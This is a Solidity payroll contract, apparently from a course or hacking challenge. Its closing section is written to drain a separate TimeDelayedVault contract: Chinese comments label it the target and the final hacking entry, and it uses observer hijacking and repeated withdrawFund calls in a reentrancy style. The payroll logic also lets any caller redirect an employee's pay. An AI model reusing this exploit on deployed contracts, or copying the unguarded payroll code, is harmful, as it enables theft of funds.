pragma solidity ^0.4.14;
import './SafeMath.sol';
import './Ownable.sol';
import './TimeDelayedVault.sol';

contract Payroll is Ownable{
    using SafeMath for uint;

    struct Employee {
        address id;
        uint salary;
        uint lastPayday;
    }

    uint constant payDuration = 10 seconds;

    address public self;
    uint totalSalary;
    uint totalEmployee;
    address[] employeeList;
    uint public stack = 0;
    uint constant stackLimit = 10;
    uint public amount;
    TimeDelayedVault vault;
    //address host = 0x9BfF611CA61a18FBcF0f179eCb59fFbA00c70968;

    mapping(address => Employee) public employees;

    function Payroll() public {
        self = this;
    }

    function changePaymentAddress (address fromEmployeeId, address toEmployeeId) employeeExit(fromEmployeeId) employeeNoExit(toEmployeeId) public {
        var employeePre = employees[fromEmployeeId];
        employees[toEmployeeId] = Employee(toEmployeeId, employeePre.salary, employeePre.lastPayday);
        delete employees[fromEmployeeId];
    }

    //settlement one employee's salary
    function _partialPaid(Employee employee) private {
        uint payment = employee.salary.mul(now.sub(employee.lastPayday)).div(payDuration);
        assert(self.balance > payment && payment > 0);
        employee.id.transfer(payment);
    }

    function addEmployee(address employeeId, uint salary) onlyOwner employeeNoExit(employeeId) public{
        uint salaryWei = salary.mul(1 ether);
        totalSalary = totalSalary.add(salaryWei);
        employees[employeeId] = Employee(employeeId, salaryWei, now);
        totalEmployee = totalEmployee.add(1);
        employeeList.push(employeeId);
        AddEmployee(employeeId);
    }

    function removeEmployee(address employeeId) onlyOwner employeeExit(employeeId) public {
        _partialPaid(employees[employeeId]);
        totalSalary = totalSalary.sub(employees[employeeId].salary);
        delete employees[employeeId];
        totalEmployee = totalEmployee.sub(1);
        uint index = getEmployeeIndex(employeeId);
        if(index >= 0 ){
          delete employeeList[index];
          uint tailIndex = employeeList.length.sub(1);
          employeeList[index] = employeeList[tailIndex];
          employeeList.length = employeeList.length.sub(1);
        }
        RemoveEmployee(employeeId);
    }

    function updateEmployee(address employeeId, uint salary) onlyOwner employeeExit(employeeId) public {
        _partialPaid(employees[employeeId]);
        totalSalary = totalSalary.sub(employees[employeeId].salary);
        uint salaryWei = salary.mul(1 ether);
        totalSalary = totalSalary.add(salaryWei);
        employees[employeeId].salary = salaryWei;
        employees[employeeId].lastPayday = now;
        UpdateEmployee(employeeId);
    }

    function checkEmployee(uint index) public view returns (address employeeId, uint salary, uint lastPayday) {
        require(index < employeeList.length);
        employeeId = employeeList[index];
        var employee = employees[employeeId];
        salary = employee.salary;
        lastPayday = employee.lastPayday;
    }

    /* function checkEmployee(address employeeId) employeeExit(employeeId) public view returns (uint salary, uint lastPayday) {
        salary = employees[employeeId].salary;
        lastPayday = employees[employeeId].lastPayday;
    } */

    function addFund() public payable returns (uint) {
      AddFund(self.balance);
      return self.balance;
    }

    function calculateRunway() public view returns (uint) {
        //assert(totalSalary > 0);
        if(totalSalary == 0)return 0;
        return self.balance.div(totalSalary);
    }

    function hasEnoughFund() public view returns (bool) {
        return calculateRunway() > 0;
    }

    function getPaid() employeeExit(msg.sender) public {
        uint nextPayday = employees[msg.sender].lastPayday.add(payDuration);
        assert(nextPayday < now);

        employees[msg.sender].lastPayday = nextPayday;
        employees[msg.sender].id.transfer(employees[msg.sender].salary);
        GetPaid(msg.sender);
    }

    function getEmployeeIndex(address employeeId) private view returns (uint) {
      for(uint i = 0; i < employeeList.length; i++) {
           if(employeeList[i] == employeeId) {
               return i;
           }
       }
    }

    function getInfo() public view returns (uint balance, uint runway, uint employeeCount) {
        balance = this.balance;
        runway = calculateRunway();
        employeeCount = totalEmployee;
    }

    function getEmployeeList() public view returns (address[]) {
      return employeeList;
    }

    /* function addMoney(address desAddress) payable {
      //
    }

    function startAttack() public {
      //
    }

    function() payable {
      if(stack ++ < stackLimit){
        //
      }
    } */

    /* function isGamer(address host, address gamer) public view returns (bool) {
        verifier = GamerVerifier(host);
        return verifier.isValidGamer(gamer);
    } */



    modifier employeeExit(address employeeId) {
        assert(employees[employeeId].id != 0x0);
        _;
    }

    modifier employeeNoExit(address employeeId) {
        assert(employees[employeeId].id == 0x0);
        _;
    }

    modifier employeeDelete(address employeeId) {
        _;
        delete employees[employeeId];
    }

    event AddEmployee (
      address employee
    );

    event RemoveEmployee (
      address employee
    );

    event UpdateEmployee (
      address employee
    );

    event GetPaid (
      address employee
    );

    event AddFund (
      uint balance
    );


    //初始化要黑的合约对象
    function initilizeVault(address host) external {
      vault = TimeDelayedVault(host);
      //vault.initilizeVault();
    }

    //把自己的合约地址设置为Observer
    function setObserver(address account) {
      vault.setObserver(account);
    }

    //实现observe方法，满足require
    function observe() public returns (bool) {
      //withdrawFund();
      return true;
    }

    //销毁合约，并且转账出来，目前没用
    function onDestroy() public{
      vault.resolve();
    }

    //获取到所有的认证用户
    function getAllAuthorizedUsers() public returns (uint) {

      //address[] result = new ;
      /* for(uint i = 0; i < 5; i++){
        address item = vault.authorizedUsers(i);
        if(item != 0x00){
          result.push(item);
        }
      } */
      //address count = vault.authorizedUsers[0];
      return 3;
    }

    //取钱，最后要黑的入口
    function withdrawFund() public {
        //vault = TimeDelayedVault(0x9bff611ca61a18fbcf0f179ecb59ffba00c70968);
        if(stack++ < stackLimit){
          //0xdC75EB0973F96b735087B6B2f20ef73595509354
          vault.withdrawFund();
        }
        //return vault.withdrawFund();
    }

    //增加认证用户
    function addAuthorizedAccount(uint votePosition, address proposal) external {
        //vault = TimeDelayedVault(0x9bff611ca61a18fbcf0f179ecb59ffba00c70968);
        vault.addAuthorizedAccount(votePosition, proposal);
    }

    //获取额外认证的用户地址
    function getAdditionalAuthAddress() public view returns (address) {
      return vault.additionalAuthorizedContract();
    }

    //获取上次取钱时间
    function getLastUpdated() public view returns (uint) {
      return vault.lastUpdated();
    }

    //获取WithdrawObserver
    function getWithdrawObserver() public view returns (address) {
      return vault.withdrawObserver();
    }
}
